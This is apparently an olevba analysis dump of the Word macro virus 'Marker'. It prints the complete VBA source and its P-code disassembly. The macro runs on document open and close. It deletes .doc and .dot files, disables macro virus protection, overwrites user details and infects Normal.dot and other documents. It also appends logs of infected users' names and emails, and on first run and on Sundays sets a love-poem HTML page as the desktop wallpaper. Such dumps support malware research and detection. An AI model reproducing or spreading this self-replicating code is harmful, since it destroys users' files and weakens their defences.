olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Marker.fp
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Marker.fp - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



'Seline, Where are you dear
Const Marker = "<- this is a marker! by jonhehehe TheBest-versi212x"

Private Sub CommandButton1_Click()

End Sub

Private Sub Document_Open()
Document_Close
End Sub
Private Sub Document_Close()
Dim nmod As Object
Dim isd As String
Dim DS, NTS, DI, NTI As Boolean
Dim Jon, Users, LogData, LogFile As String
On Error Resume Next
AddIns.Unload True
Kill Options.DefaultFilePath(8) & "\*.doc"
Kill Options.DefaultFilePath(8) & "\*.dot"
Options.VirusProtection = False
Application.UserName = "JonMMx 2000"
Application.UserInitials = "MeMeX"
Application.UserAddress = "JonMMx2000@yahoo.com"
Application.EnableCancelKey = wdCancelDisabled
GoSub InsertIon
If (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", _
   "LogData in") = False) Then GoSub LoggingIn
If WeekDay(Now()) = 1 Then GoSub ShowMe
GoTo Finish
InsertIon:
Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
DI = AD.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NTI = NT.CodeModule.Find(Marker, 1, 1, 10000, 10000)
If (DI Xor NTI) And (ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate) Then
 If DI Then
   NTS = NormalTemplate.Saved
   Jon = AD.CodeModule.Lines(1, AD.CodeModule.CountOfLines)
   For i = 1 To Len(Application.UserAddress)
    If (Mid(Application.UserAddress, i, 1) <> Chr(13)) Then
       If (Mid(Application.UserAddress, i, 1) <> Chr(10)) Then
          Users = Users & Mid(Application.UserAddress, i, 1)
       End If
    Else
       Users = Users & Chr(13) & " '"
    End If
   Next
   Jon = Jon & Chr(13) & _
         "' " & Format(Time, "hh:mm:sc AMPM-") & _
                Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
         "' " & Application.UserName & Chr(13) & _
         "' " & Users & Chr(13) & Chr(13) & " "
   NT.CodeModule.DeleteLines 1, NT.CodeModule.CountOfLines
   NT.CodeModule.AddFromString Jon
   If NTS Then NormalTemplate.Save
 End If
 If NTI Then
    DS = ActiveDocument.Saved
    Jon = NT.CodeModule.Lines(1, NT.CodeModule.CountOfLines)
    AD.CodeModule.DeleteLines 1, AD.CodeModule.CountOfLines
    AD.CodeModule.AddFromString Jon
    If DS Then ActiveDocument.Save
 End If
End If
Return
LoggingIn:
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogData in") = True
   GoSub ShowMe
Return
ShowMe:
Dim RootsyS As String
On Error Resume Next
 RootsyS = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot")
 Open RootsyS & "\Jon.html" For Output As #1
 Print #1, "<Html><head><title>Welcome to Destroyer of the last Manillenium JontheBEST</title></head><Body><body bgcolor = '#FFF212' >"
 Print #1, "<center><p align='center'><font color='#800000'size='25'><strong>a Poet For My Dear Love</strong></font></p>"
 Print #1, "<p align='center'><font color='#000000' size='6'><strong><a href='mailto:iamwaiting@yahoo.com'>Dear Iin</a></strong></font> </p>"
 Print #1, "<font normal></center>To the very best that happen in mylife<p>"
 Print #1, "<p>Long ago and in my mind, I can see your face lonely and lost in time "
 Print #1, "<p>You were gone since yester month But the memories, never would dissapear"
 Print #1, "<p>I think of you, I THINK OF YOU.<p>"
 Print #1, "<p>Yes it's true I can pretend. But the paint of blue, keep beat me till the end."
 Print #1, "<p>Yes it's hard to understand. Why you leaving me and all we dreaming on "
 Print #1, "<p>Dear Iin, I close my eyes and see your face.  That's all I have to do to be with you. "
 Print #1, "<p>Dear Iin, altough I can not touch your face.  I know what I can do to be with you "
 Print #1, "<p>Long ago so faraway. But the light of blue, still living with me today."
 Print #1, "<p>You were gone since yester month.  But the memories never would dissapear."
 Print #1, "<center><font color='#245505' size='6'><strong><p>Speed Hari</strong></font></center></Body></html>"
 Close #1
 System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General", "Wallpaper") = RootsyS & "\Jon.html"
Return
Finish:
End Sub
'Logfile -->

' 06:14:2518:14:25 -Kamis, 22 Jul 1999
' JonMMx 2000
' jonthebest@hotbot.com


' 09:07:259:07:25 -Sabtu, 24 Jun 2017
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 12:13:3712:13:37 AM AM-Saturday, 14 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:55:459:55:45 AM AM-Wednesday, 25 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 04:05:474:05:47 AM AM-Thursday, 26 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 07:41:387:41:38 PM PM-Friday, 27 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 07:17:367:17:36 -Jumat, 27 Agust 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 05:31:365:31:36 PM PM-Thursday, 2 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 11:07:5111:07:51 PM PM-Friday, 11 Sep 1998
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 06:24:546:24:54 -Senin, 1 Jan 1996
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 03:46:113:46:11 AM AM-Friday, 24 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 05:53:595:53:59 AM AM-Friday, 24 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 03:04:815:04:08 -Kamis, 30 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 12:04:220:04:22 -Rabu, 6 Okt 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 03:59:533:59:53 -domingo, 10 oct 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:23:1910:23:19 PM PM-Wednesday, 11 Jan 1995
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 11:59:1311:59:13 PM PM-Monday, 11 Oct 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 03:08:493:08:49 AM AM-Sunday, 17 Oct 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 11:04:3611:04:36 PM PM-Monday, 18 Oct 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 04:19:534:19:53 PM PM-Monday, 25 Oct 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 07:12:497:12:49 PM PM-Monday, 1 Nov 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:11:1321:11:13  PM-Senin, 1 Nop 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 12:59:1512:59:15 PM PM-Sunday, 6 Oct 1996
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 06:36:76:36:07 -Selasa, 17 Feb 2004
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 07:26:107:26:10 AM AM-Monday, 24 Jan 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 03:13:143:13:14 PM PM-Tuesday, 8 Feb 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:37:279:37:27 -Kamis, 30 Mar 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:46:2914:46:29 -Selasa, 25 Apr 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 06:06:116:06:11 PM PM-Thursday, 13 Jul 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 05:13:3217:13:32 -Monday, 28 Aug 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:00:399:00:39 AM AM-Thursday, 12 Oct 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 01:14:1413:14:14 -Thursday, 23 Nov 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 08:40:5208:40:52 -Mittwoch, 21 Feb 2001
' JonMMx 2000
' JonMMx2000@yahoo.com

 

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Marker.fp
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 15928 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' 	QuoteRem 0x0000 0x001A "Seline, Where are you dear"
' Line #4:
' 	Dim (Const) 
' 	LitStr 0x0033 "<- this is a marker! by jonhehehe TheBest-versi212x"
' 	VarDefn Marker
' Line #5:
' Line #6:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #7:
' Line #8:
' 	EndSub 
' Line #9:
' Line #10:
' 	FuncDefn (Private Sub Document_Open())
' Line #11:
' 	ArgsCall Document_Close 0x0000 
' Line #12:
' 	EndSub 
' Line #13:
' 	FuncDefn (Private Sub Document_Close())
' Line #14:
' 	Dim 
' 	VarDefn nmod (As Object)
' Line #15:
' 	Dim 
' 	VarDefn isd (As String)
' Line #16:
' 	Dim 
' 	VarDefn DS
' 	VarDefn NTS
' 	VarDefn DI
' 	VarDefn NTI (As Boolean)
' Line #17:
' 	Dim 
' 	VarDefn Jon
' 	VarDefn Users
' 	VarDefn LogData
' 	VarDefn LogFile (As String)
' Line #18:
' 	OnError (Resume Next) 
' Line #19:
' 	LitVarSpecial (True)
' 	Ld AddIns 
' 	ArgsMemCall Unlock 0x0001 
' Line #20:
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0006 "\*.doc"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #21:
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0006 "\*.dot"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #22:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #23:
' 	LitStr 0x000B "JonMMx 2000"
' 	Ld Application 
' 	MemSt UserName 
' Line #24:
' 	LitStr 0x0005 "MeMeX"
' 	Ld Application 
' 	MemSt UserInitials 
' Line #25:
' 	LitStr 0x0014 "JonMMx2000@yahoo.com"
' 	Ld Application 
' 	MemSt UserAddress 
' Line #26:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #27:
' 	GoSub InsertIon 
' Line #28:
' 	LineCont 0x0004 0A 00 03 00
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x000A "LogData in"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	GoSub LoggingIn 
' 	EndIf 
' Line #29:
' 	ArgsLd Now 0x0000 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoSub ShowMe 
' 	EndIf 
' Line #30:
' 	GoTo Finish 
' Line #31:
' 	Label InsertIon 
' Line #32:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set AD 
' Line #33:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set NT 
' Line #34:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St DI 
' Line #35:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St NTI 
' Line #36:
' 	Ld DI 
' 	Ld NTI 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #37:
' 	Ld DI 
' 	IfBlock 
' Line #38:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St NTS 
' Line #39:
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St Jon 
' Line #40:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd UserAddress 
' 	FnLen 
' 	For 
' Line #41:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #42:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #43:
' 	Ld Users 
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St Users 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	ElseBlock 
' Line #46:
' 	Ld Users 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 " '"
' 	Concat 
' 	St Users 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	StartForVariable 
' 	Next 
' Line #49:
' 	LineCont 0x0010 09 00 09 00 12 00 10 00 1E 00 09 00 29 00 09 00
' 	Ld Jon 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Time 
' 	LitStr 0x000E "hh:mm:sc AMPM-"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	Ld Date 
' 	LitStr 0x0010 "dddd, d mmm yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Users 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	St Jon 
' Line #50:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #51:
' 	Ld Jon 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #52:
' 	Ld NTS 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #53:
' 	EndIfBlock 
' Line #54:
' 	Ld NTI 
' 	IfBlock 
' Line #55:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St DS 
' Line #56:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St Jon 
' Line #57:
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #58:
' 	Ld Jon 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #59:
' 	Ld DS 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	EndIfBlock 
' Line #62:
' 	Return 
' Line #63:
' 	Label LoggingIn 
' Line #64:
' 	LitVarSpecial (True)
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x000A "LogData in"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #65:
' 	GoSub ShowMe 
' Line #66:
' 	Return 
' Line #67:
' 	Label ShowMe 
' Line #68:
' 	Dim 
' 	VarDefn RootsyS (As String)
' Line #69:
' 	OnError (Resume Next) 
' Line #70:
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000A "SystemRoot"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St RootsyS 
' Line #71:
' 	Ld RootsyS 
' 	LitStr 0x0009 "\Jon.html"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #72:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x007A "<Html><head><title>Welcome to Destroyer of the last Manillenium JontheBEST</title></head><Body><body bgcolor = '#FFF212' >"
' 	PrintItemNL 
' Line #73:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x006C "<center><p align='center'><font color='#800000'size='25'><strong>a Poet For My Dear Love</strong></font></p>"
' 	PrintItemNL 
' Line #74:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0080 "<p align='center'><font color='#000000' size='6'><strong><a href='mailto:iamwaiting@yahoo.com'>Dear Iin</a></strong></font> </p>"
' 	PrintItemNL 
' Line #75:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003F "<font normal></center>To the very best that happen in mylife<p>"
' 	PrintItemNL 
' Line #76:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0048 "<p>Long ago and in my mind, I can see your face lonely and lost in time "
' 	PrintItemNL 
' Line #77:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004B "<p>You were gone since yester month But the memories, never would dissapear"
' 	PrintItemNL 
' Line #78:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0025 "<p>I think of you, I THINK OF YOU.<p>"
' 	PrintItemNL 
' Line #79:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0051 "<p>Yes it's true I can pretend. But the paint of blue, keep beat me till the end."
' 	PrintItemNL 
' Line #80:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004A "<p>Yes it's hard to understand. Why you leaving me and all we dreaming on "
' 	PrintItemNL 
' Line #81:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0059 "<p>Dear Iin, I close my eyes and see your face.  That's all I have to do to be with you. "
' 	PrintItemNL 
' Line #82:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0055 "<p>Dear Iin, altough I can not touch your face.  I know what I can do to be with you "
' 	PrintItemNL 
' Line #83:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004A "<p>Long ago so faraway. But the light of blue, still living with me today."
' 	PrintItemNL 
' Line #84:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004D "<p>You were gone since yester month.  But the memories never would dissapear."
' 	PrintItemNL 
' Line #85:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0063 "<center><font color='#245505' size='6'><strong><p>Speed Hari</strong></font></center></Body></html>"
' 	PrintItemNL 
' Line #86:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #87:
' 	Ld RootsyS 
' 	LitStr 0x0009 "\Jon.html"
' 	Concat 
' 	LitStr 0x0000 ""
' 	LitStr 0x0046 "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General"
' 	LitStr 0x0009 "Wallpaper"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #88:
' 	Return 
' Line #89:
' 	Label Finish 
' Line #90:
' 	EndSub 
' Line #91:
' 	QuoteRem 0x0000 0x000B "Logfile -->"
' Line #92:
' Line #93:
' 	QuoteRem 0x0000 0x0025 " 06:14:2518:14:25 -Kamis, 22 Jul 1999"
' Line #94:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #95:
' 	QuoteRem 0x0000 0x0016 " jonthebest@hotbot.com"
' Line #96:
' Line #97:
' Line #98:
' 	QuoteRem 0x0000 0x0024 " 09:07:259:07:25 -Sabtu, 24 Jun 2017"
' Line #99:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #100:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #101:
' Line #102:
' Line #103:
' Line #104:
' Line #105:
' 	QuoteRem 0x0000 0x002D " 12:13:3712:13:37 AM AM-Saturday, 14 Aug 1999"
' Line #106:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #107:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #108:
' Line #109:
' Line #110:
' Line #111:
' Line #112:
' 	QuoteRem 0x0000 0x002D " 09:55:459:55:45 AM AM-Wednesday, 25 Aug 1999"
' Line #113:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #114:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #115:
' Line #116:
' Line #117:
' Line #118:
' Line #119:
' 	QuoteRem 0x0000 0x002C " 04:05:474:05:47 AM AM-Thursday, 26 Aug 1999"
' Line #120:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #121:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #122:
' Line #123:
' Line #124:
' Line #125:
' Line #126:
' 	QuoteRem 0x0000 0x002A " 07:41:387:41:38 PM PM-Friday, 27 Aug 1999"
' Line #127:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #128:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #129:
' Line #130:
' Line #131:
' Line #132:
' Line #133:
' 	QuoteRem 0x0000 0x0026 " 07:17:367:17:36 -Jumat, 27 Agust 1999"
' Line #134:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #135:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #136:
' Line #137:
' Line #138:
' Line #139:
' Line #140:
' 	QuoteRem 0x0000 0x002B " 05:31:365:31:36 PM PM-Thursday, 2 Sep 1999"
' Line #141:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #142:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #143:
' Line #144:
' Line #145:
' Line #146:
' Line #147:
' 	QuoteRem 0x0000 0x002B " 11:07:5111:07:51 PM PM-Friday, 11 Sep 1998"
' Line #148:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #149:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #150:
' Line #151:
' Line #152:
' Line #153:
' Line #154:
' 	QuoteRem 0x0000 0x0023 " 06:24:546:24:54 -Senin, 1 Jan 1996"
' Line #155:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #156:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #157:
' Line #158:
' Line #159:
' Line #160:
' Line #161:
' 	QuoteRem 0x0000 0x002A " 03:46:113:46:11 AM AM-Friday, 24 Sep 1999"
' Line #162:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #163:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #164:
' Line #165:
' Line #166:
' Line #167:
' Line #168:
' 	QuoteRem 0x0000 0x002A " 05:53:595:53:59 AM AM-Friday, 24 Sep 1999"
' Line #169:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #170:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #171:
' Line #172:
' Line #173:
' Line #174:
' Line #175:
' 	QuoteRem 0x0000 0x0024 " 03:04:815:04:08 -Kamis, 30 Sep 1999"
' Line #176:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #177:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #178:
' Line #179:
' Line #180:
' Line #181:
' Line #182:
' 	QuoteRem 0x0000 0x0022 " 12:04:220:04:22 -Rabu, 6 Okt 1999"
' Line #183:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #184:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #185:
' Line #186:
' Line #187:
' Line #188:
' Line #189:
' 	QuoteRem 0x0000 0x0026 " 03:59:533:59:53 -domingo, 10 oct 1999"
' Line #190:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #191:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #192:
' Line #193:
' Line #194:
' Line #195:
' Line #196:
' 	QuoteRem 0x0000 0x002E " 10:23:1910:23:19 PM PM-Wednesday, 11 Jan 1995"
' Line #197:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #198:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #199:
' Line #200:
' Line #201:
' Line #202:
' Line #203:
' 	QuoteRem 0x0000 0x002B " 11:59:1311:59:13 PM PM-Monday, 11 Oct 1999"
' Line #204:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #205:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #206:
' Line #207:
' Line #208:
' Line #209:
' Line #210:
' 	QuoteRem 0x0000 0x002A " 03:08:493:08:49 AM AM-Sunday, 17 Oct 1999"
' Line #211:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #212:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #213:
' Line #214:
' Line #215:
' Line #216:
' Line #217:
' 	QuoteRem 0x0000 0x002B " 11:04:3611:04:36 PM PM-Monday, 18 Oct 1999"
' Line #218:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #219:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #220:
' Line #221:
' Line #222:
' Line #223:
' Line #224:
' 	QuoteRem 0x0000 0x002A " 04:19:534:19:53 PM PM-Monday, 25 Oct 1999"
' Line #225:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #226:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #227:
' Line #228:
' Line #229:
' Line #230:
' Line #231:
' 	QuoteRem 0x0000 0x0029 " 07:12:497:12:49 PM PM-Monday, 1 Nov 1999"
' Line #232:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #233:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #234:
' Line #235:
' Line #236:
' Line #237:
' Line #238:
' 	QuoteRem 0x0000 0x0027 " 09:11:1321:11:13  PM-Senin, 1 Nop 1999"
' Line #239:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #240:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #241:
' Line #242:
' Line #243:
' Line #244:
' Line #245:
' 	QuoteRem 0x0000 0x002A " 12:59:1512:59:15 PM PM-Sunday, 6 Oct 1996"
' Line #246:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #247:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #248:
' Line #249:
' Line #250:
' Line #251:
' Line #252:
' 	QuoteRem 0x0000 0x0024 " 06:36:76:36:07 -Selasa, 17 Feb 2004"
' Line #253:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #254:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #255:
' Line #256:
' Line #257:
' Line #258:
' Line #259:
' 	QuoteRem 0x0000 0x002A " 07:26:107:26:10 AM AM-Monday, 24 Jan 2000"
' Line #260:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #261:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #262:
